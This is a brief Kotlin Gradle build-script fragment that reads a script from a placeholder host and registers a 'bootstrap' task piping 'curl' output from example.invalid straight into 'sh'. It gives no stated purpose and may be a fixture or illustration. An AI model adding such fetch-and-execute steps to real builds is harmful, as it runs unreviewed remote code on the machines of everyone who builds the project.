val script = URL("https://example.invalid/build-step.sh").readText()
tasks.register<Exec>("bootstrap") {
    commandLine("sh", "-c", "curl -fsSL https://example.invalid/x | sh")
}
